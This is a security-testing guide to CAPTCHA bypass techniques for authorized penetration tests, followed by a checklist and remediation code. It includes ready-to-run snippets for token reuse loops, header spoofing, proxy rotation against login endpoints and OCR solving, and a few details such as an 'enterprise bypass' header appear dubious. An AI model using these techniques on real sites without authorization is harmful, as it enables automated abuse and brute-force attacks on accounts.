# CAPTCHA Bypass Testing for Authorized Pentesting

Comprehensive guide to testing CAPTCHA implementations during authorized security assessments.

---

## CAPTCHA Types

### 1. Google reCAPTCHA v2
- Checkbox "I'm not a robot"
- Image selection challenges
- Behavioral analysis

### 2. Google reCAPTCHA v3
- Invisible background scoring
- No user interaction
- Risk score (0.0-1.0)

### 3. hCaptcha
- Similar to reCAPTCHA v2
- Privacy-focused alternative
- Image challenges

### 4. Image-Based
- Character recognition (distorted text)
- Math problems
- Object identification

### 5. Behavioral
- Mouse movement patterns
- Timing analysis
- Interaction patterns

---

## Testing Methodology

### Phase 1: Reconnaissance

```
Identify CAPTCHA implementation:
1. Inspect page source for CAPTCHA tokens
2. Check HTTP requests for CAPTCHA parameters
3. Identify CAPTCHA provider (reCAPTCHA, hCaptcha, custom)
4. Note where CAPTCHA is required (login, signup, forms)
5. Observe validation flow (client vs server-side)
```

### Phase 2: Bypass Vector Testing

## Bypass Technique 1: Missing Server-Side Validation

**Description**: CAPTCHA validated only on client-side

**Test**:
```javascript
// Remove CAPTCHA parameter from request
const formData = {
  username: "test",
  password: "test123",
  // captcha: "removed"  // Try removing this
};

// Submit without CAPTCHA
await fetch('/login', {
  method: 'POST',
  body: JSON.stringify(formData)
});
```

**Expected if vulnerable**: Request processes without CAPTCHA

---

## Bypass Technique 2: Empty Field Submission

**Description**: CAPTCHA accepts empty values

**Test**:
```javascript
// Submit with empty CAPTCHA field
const formData = {
  username: "test",
  password: "test123",
  captcha: ""  // Empty string
};
```

**Variations**:
- Empty string: `""`
- Null: `null`
- Undefined: (omit parameter)
- Whitespace: `" "`

---

## Bypass Technique 3: Reusable CAPTCHA Tokens

**Description**: CAPTCHA tokens don't expire or can be reused

**Test**:
```javascript
// 1. Solve CAPTCHA once and capture token
const validToken = "captured_from_previous_request";

// 2. Reuse token in multiple requests
for (let i = 0; i < 100; i++) {
  await submitForm({
    captcha: validToken  // Same token
  });
}
```

**Check for**:
- Token expiration (should expire after use)
- One-time use enforcement
- Time-based expiration

---

## Bypass Technique 4: HTTP Header Manipulation

**Description**: Bypass using custom headers to appear as different source

**Test**:
```javascript
// Add headers to evade IP-based CAPTCHA
await fetch('/login', {
  method: 'POST',
  headers: {
    'X-Forwarded-For': '127.0.0.1',
    'X-Remote-IP': '192.168.1.1',
    'X-Original-IP': '10.0.0.1',
    'X-Remote-Addr': '172.16.0.1'
  },
  body: formData
});
```

**Variations**:
- Localhost: `127.0.0.1`
- Private IPs: `192.168.x.x`, `10.x.x.x`
- Spoofed public IPs

---

## Bypass Technique 5: Content-Type Conversion

**Description**: Change request format to bypass CAPTCHA validation

**Test**:
```javascript
// Convert form submission to JSON
// Original: application/x-www-form-urlencoded
// Changed: application/json

await fetch('/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'  // Changed
  },
  body: JSON.stringify({
    username: "test",
    password: "test123"
    // No CAPTCHA parameter
  })
});
```

**Variations**:
- `application/json`
- `text/plain`
- `application/xml`
- `multipart/form-data`

---

## Bypass Technique 6: Request Method Modification

**Description**: Switch HTTP method to bypass CAPTCHA

**Test**:
```javascript
// Original: POST /login
// Try: GET /login with parameters

// Convert POST to GET
await fetch('/login?username=test&password=test123', {
  method: 'GET'  // Changed from POST
});

// Or try PUT/PATCH
await fetch('/login', {
  method: 'PUT',
  body: formData
});
```

**Methods to test**: GET, POST, PUT, PATCH, DELETE

---

## Bypass Technique 7: Parameter Manipulation

**Description**: Modify CAPTCHA parameters to bypass validation

**Test**:
```javascript
// Try various parameter modifications
const tests = [
  { captcha: "0" },           // Zero
  { captcha: "null" },        // String "null"
  { captcha: "undefined" },   // String "undefined"
  { captcha: "true" },        // Boolean as string
  { captcha: "1" },           // Simple number
  { captcha: "[]" },          // Empty array
  { captcha: "{}" },          // Empty object
  { "g-recaptcha-response": "bypass" }  // Direct token manipulation
];

for (const test of tests) {
  await submitForm(test);
}
```

---

## Bypass Technique 8: Rate Limit Evasion with Proxies

**Description**: Use rotating proxies to bypass IP-based rate limiting

**Test**:
```python
import requests
from itertools import cycle

proxies = [
    "http://proxy1.com:8080",
    "http://proxy2.com:8080",
    "http://proxy3.com:8080"
]

proxy_pool = cycle(proxies)

for i in range(100):
    proxy = next(proxy_pool)
    response = requests.post(
        "https://target.com/login",
        proxies={"http": proxy, "https": proxy},
        data={"username": "test", "password": "test"}
    )
```

---

## Bypass Technique 9: OCR for Image-Based CAPTCHAs

**Description**: Use OCR to solve text-based CAPTCHAs

**Test**:
```python
import pytesseract
from PIL import Image
import requests

# 1. Download CAPTCHA image
captcha_url = "https://target.com/captcha.php"
img_data = requests.get(captcha_url).content

# 2. Save and process
with open('captcha.png', 'wb') as f:
    f.write(img_data)

# 3. OCR
image = Image.open('captcha.png')
captcha_text = pytesseract.image_to_string(image)

# 4. Submit solution
response = requests.post('/verify', data={'captcha': captcha_text})
```

**Tools**:
- Tesseract OCR
- Google Vision API
- CAPTCHA solving services (for testing only)

---

## Bypass Technique 10: Response Manipulation

**Description**: Intercept and modify CAPTCHA validation response

**Test**:
```javascript
// Using browser DevTools or proxy
// 1. Submit form with invalid CAPTCHA
// 2. Intercept response:
{
  "success": false,  // Change to true
  "captcha_valid": false,  // Change to true
  "error": "Invalid CAPTCHA"  // Remove
}

// 3. Modified response:
{
  "success": true,
  "captcha_valid": true
}
```

---

## Bypass Technique 11: JavaScript Disable

**Description**: Disable JavaScript to bypass client-side validation

**Test with Playwright**:
```javascript
// Disable JavaScript
await playwright_run_code({
  code: `async (page) => {
    await page.context().setExtraHTTPHeaders({
      'User-Agent': 'Mozilla/5.0'
    });
    await page.setJavaScriptEnabled(false);
    await page.goto('https://target.com/login');
  }`
});
```

---

## reCAPTCHA v3 Bypass

### Technique: Score Manipulation

**Description**: reCAPTCHA v3 returns a score (0.0-1.0). Test if low scores are accepted.

**Test**:
```javascript
// 1. Capture token with automation (will have low score)
const response = await fetch('https://www.google.com/recaptcha/api/siteverify', {
  method: 'POST',
  body: JSON.stringify({
    secret: 'SITE_SECRET',
    response: automatedToken
  })
});

// 2. Check if application accepts low-score tokens
// Application should reject scores < 0.5
```

### Technique: Token Reuse

**Test**:
```javascript
// Generate token once
const token = await grecaptcha.execute('SITE_KEY');

// Reuse multiple times
for (let i = 0; i < 10; i++) {
  await submitForm({ 'g-recaptcha-response': token });
}
```

---

## hCaptcha Bypass

### Technique: Missing Validation

**Test**:
```javascript
// Submit without h-captcha-response
await fetch('/submit', {
  method: 'POST',
  body: JSON.stringify({
    data: "test",
    // 'h-captcha-response': ''  // Omitted
  })
});
```

### Technique: Enterprise Bypass

**Test**:
```javascript
// Check for enterprise bypass header
await fetch('/submit', {
  headers: {
    'X-HCaptcha-Bypass': 'enterprise_token'
  }
});
```

---

## Testing Checklist

### Server-Side Validation

- [ ] CAPTCHA validated on server (not just client)
- [ ] Token expires after single use
- [ ] Token has time-based expiration (< 5 minutes)
- [ ] Invalid tokens are rejected
- [ ] Empty/null values are rejected

### Rate Limiting

- [ ] Rate limiting per IP address
- [ ] Rate limiting per session
- [ ] Rate limiting per account
- [ ] Progressive delays on failures
- [ ] Account lockout after X attempts

### Token Security

- [ ] Tokens are cryptographically random
- [ ] Tokens are not predictable
- [ ] Tokens cannot be reused
- [ ] Tokens are tied to session
- [ ] Tokens expire appropriately

### Implementation

- [ ] CAPTCHA on all sensitive endpoints
- [ ] CAPTCHA difficulty scales with risk
- [ ] Backup CAPTCHA if primary fails
- [ ] Accessibility alternatives provided
- [ ] Error messages don't leak info

---

## Common Vulnerabilities

### High Severity

**Missing Server-Side Validation**:
- CVSS: 7.5 (High)
- Impact: Complete CAPTCHA bypass
- Fix: Validate all tokens server-side

**Reusable Tokens**:
- CVSS: 7.0 (High)
- Impact: Automated abuse
- Fix: Enforce one-time use

**No Rate Limiting**:
- CVSS: 6.5 (Medium)
- Impact: Brute force attacks
- Fix: Implement rate limiting

### Medium Severity

**Predictable Tokens**:
- CVSS: 5.5 (Medium)
- Impact: Token generation
- Fix: Use cryptographic randomness

**Client-Side Only**:
- CVSS: 5.0 (Medium)
- Impact: Easy bypass
- Fix: Move validation server-side

---

## Playwright Automation Examples

### Test Missing Validation

```javascript
// Navigate to form
await playwright_navigate({ url: 'https://target.com/signup' });

// Fill form
await playwright_type({
  element: 'username',
  ref: 'input[name="username"]',
  text: 'testuser'
});

// Evaluate: Remove CAPTCHA field
await playwright_evaluate({
  function: `() => {
    document.querySelector('input[name="captcha"]').remove();
  }`
});

// Submit
await playwright_click({
  element: 'submit button',
  ref: 'button[type="submit"]'
});

// Check if bypassed
const snapshot = await playwright_snapshot();
// Analyze response
```

### Test Token Reuse

```javascript
// 1. Solve CAPTCHA once
await playwright_click({
  element: 'recaptcha checkbox',
  ref: 'iframe#recaptcha'
});

// 2. Capture token
const token = await playwright_evaluate({
  function: `() => document.querySelector('[name="g-recaptcha-response"]').value`
});

// 3. Reuse token multiple times
for (let i = 0; i < 10; i++) {
  await playwright_evaluate({
    function: `() => {
      document.querySelector('[name="g-recaptcha-response"]').value = '${token}';
      document.querySelector('form').submit();
    }`
  });

  await playwright_wait_for({ time: 2 });
}
```

---

## Remediation Recommendations

**For System Owners**:

1. **Server-Side Validation**: Always validate CAPTCHA tokens on server
2. **Token Expiration**: Enforce one-time use and time limits
3. **Rate Limiting**: Implement progressive delays
4. **Modern CAPTCHAs**: Use reCAPTCHA v3 with risk scoring
5. **Behavioral Analysis**: Add behavioral biometrics
6. **Monitoring**: Log and alert on bypass attempts

**Implementation Example**:
```python
from recaptcha import verify_recaptcha

def validate_captcha(token, remote_ip):
    # Server-side validation
    result = verify_recaptcha(
        secret_key=RECAPTCHA_SECRET,
        response=token,
        remoteip=remote_ip
    )

    if not result['success']:
        return False

    # For v3: Check score
    if result.get('score', 0) < 0.5:
        return False

    # Check token age
    if is_token_expired(token):
        return False

    # Mark token as used
    mark_token_used(token)

    return True
```

---

## Tools & Resources

**Testing Tools**:
- Burp Suite (Intruder, Repeater)
- Playwright MCP
- Postman
- curl
- Browser DevTools

**OCR Tools**:
- Tesseract OCR
- pytesseract
- Google Vision API

**References**:
- [CAPTCHA Bypass Techniques](https://medium.com/@mtsboysquad001/captcha-bypass-28de7279865b)
- [PortSwigger CAPTCHA Research](https://portswigger.net/research/cracking-recaptcha-turbo-intruder-style)
- [Security Cipher CAPTCHA Guide](https://securitycipher.com/docs/security/penetration-testing-tricks/captcha-bypass/)
